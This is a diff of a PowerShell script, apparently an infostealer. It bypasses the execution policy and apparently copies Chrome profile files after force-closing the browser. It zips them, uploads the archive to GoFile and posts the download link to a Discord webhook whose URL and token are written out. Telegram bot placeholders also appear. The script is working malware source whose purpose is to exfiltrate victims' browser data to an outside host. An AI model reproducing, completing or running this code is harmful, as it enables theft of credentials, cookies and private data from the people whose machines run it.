@@ -1,25 +1,18 @@
 # Ensure execution policy is bypassed
 Set-ExecutionPolicy Bypass -Scope Process -Force
 
+# Debug log file
+$logFile = "$env:TEMP\debug_log.txt"
+
 # Created by mrproxy
 $botToken = "your-telegram-bot-token"   # Replace with your Telegram bot token
 $chatID = "your-chat-id"               # Replace with your Telegram chat ID
 $webhook = "https://discord.com/api/webhooks/1337216489618542663/z9sFeu7hQPxBUEZ81XN_CHsT3eOSQnAV7XraeCcMJFrkYugTolNcnztAnLbiq516mTB0"  # Replace with your Discord Webhook URL
 
-# Debug log file
-$logFile = "$env:TEMP\debug_log.txt"
+# Clear the debug log at the start of the script
+Clear-Content -Path $logFile -Force
 
-# Force close Chrome to ensure files aren't in use
-$chromeProcesses = Get-Process -Name "chrome" -ErrorAction SilentlyContinue
-if ($chromeProcesses) {
-    # Attempt to gracefully stop Chrome processes
-    Stop-Process -Name "chrome" -Force
-    Add-Content -Path $logFile -Value "Force closed Chrome to ensure files aren't in use."
-} else {
-    Add-Content -Path $logFile -Value "No Chrome processes found to close."
-}
-
-# Function for sending messages through Discord Webhook
+# Function to send messages to Discord
 function Send-DiscordMessage {
     param ([string]$message)
 
@@ -40,22 +33,21 @@ function Upload-FileAndGetLink {
         [string]$filePath
     )
 
-    # Debug log entry at the start of the function
-    Add-Content -Path $logFile -Value "Starting upload for file: $filePath"
-    
-  # Step 1: Get available GoFile upload server
-Add-Content -Path $logFile -Value "Getting GoFile server..."
-$serverResponse = Invoke-RestMethod -Uri 'https://api.gofile.io/servers' -Method Get
-if (-not $serverResponse.data.servers) {
-    Add-Content -Path $logFile -Value "Failed to get GoFile server: $($serverResponse.status)"
-    Send-DiscordMessage -message "Failed to get GoFile server."
-    return $null
-}
+    # Step 1: Get available GoFile upload server
+    Add-Content -Path $logFile -Value "Getting GoFile server..."
+    $serverResponse = Invoke-RestMethod -Uri 'https://api.gofile.io/servers' -Method Get
+    Add-Content -Path $logFile -Value "Received server response: $($serverResponse | ConvertTo-Json)"
 
-# Select the first available server from the list
-$uploadServer = $serverResponse.data.servers[0].name
-$uploadUri = "https://$uploadServer.gofile.io/contents/uploadfile"
-Add-Content -Path $logFile -Value "GoFile server found: $uploadUri"
+    if (-not $serverResponse.data.servers) {
+        Add-Content -Path $logFile -Value "Failed to get GoFile server: $($serverResponse.status)"
+        Send-DiscordMessage -message "Failed to get GoFile server."
+        return $null
+    }
+
+    # Select the first available server from the list
+    $uploadServer = $serverResponse.data.servers[0].name
+    $uploadUri = "https://$uploadServer.gofile.io/contents/uploadfile"
+    Add-Content -Path $logFile -Value "GoFile server selected: $uploadServer, Upload URI: $uploadUri"
 
     # Step 2: Check if file exists before attempting upload
     if (-not (Test-Path $filePath)) {
@@ -75,8 +67,10 @@ Add-Content -Path $logFile -Value "GoFile server found: $uploadUri"
         }
 
         # Step 4: Upload the file
-        Add-Content -Path $logFile -Value "Uploading file..."
+        Add-Content -Path $logFile -Value "Uploading file to $uploadUri..."
         $response = Invoke-RestMethod -Uri $uploadUri -Method Post -Form $body
+        Add-Content -Path $logFile -Value "Received response from upload: $($response | ConvertTo-Json)"
+
         if ($response.status -ne "ok" -or -not $response.data.downloadPage) {
             Add-Content -Path $logFile -Value "Failed to upload file: $($response.status)"
             Send-DiscordMessage -message "Failed to upload file to GoFile."
@@ -127,7 +121,7 @@ function Copy-WithRetry {
     return $success
 }
 
-# Updated file copy loop using retry logic
+# Main file backup and zip logic
 try {
     if (Test-Path $outputZip) {
         Remove-Item $outputZip -Force
@@ -161,24 +155,18 @@ try {
     Add-Content -Path $logFile -Value "Failed to create ZIP file: $_"
     exit
 }
+
 # After all files are copied and compressed, upload the zip file to GoFile
 if (Test-Path $outputZip) {
-    Add-Content -Path $logFile -Value "Found zip file: $outputZip. Attempting to upload..."
-    
-    # Add logging to confirm function call
-    try {
-        $uploadLink = Upload-FileAndGetLink -filePath $outputZip
-        if ($uploadLink) {
-            Add-Content -Path $logFile -Value "Upload successful. Link: $uploadLink"
-            Send-DiscordMessage -message "File uploaded successfully: $uploadLink"
-        } else {
-            Add-Content -Path $logFile -Value "Failed to upload zip file to GoFile."
-            Send-DiscordMessage -message "Failed to upload zip file."
-        }
-    } catch {
-        Add-Content -Path $logFile -Value "Error during upload attempt: $_"
-        Send-DiscordMessage -message "Error during file upload."
+    Add-Content -Path $logFile -Value "Uploading the zip file to GoFile..."
+    $uploadLink = Upload-FileAndGetLink -filePath $outputZip
+    if ($uploadLink) {
+        Add-Content -Path $logFile -Value "Upload successful. Link: $uploadLink"
+    } else {
+        Add-Content -Path $logFile -Value "Failed to upload zip file to GoFile."
+        Send-DiscordMessage -message "Failed to upload zip file."
     }
 } else {
-    Add-Content -Path $logFile -Value "Output zip file not found. Skipping upload."
+    Add-Content -Path $logFile -Value "Output zip file not found."
 }
+
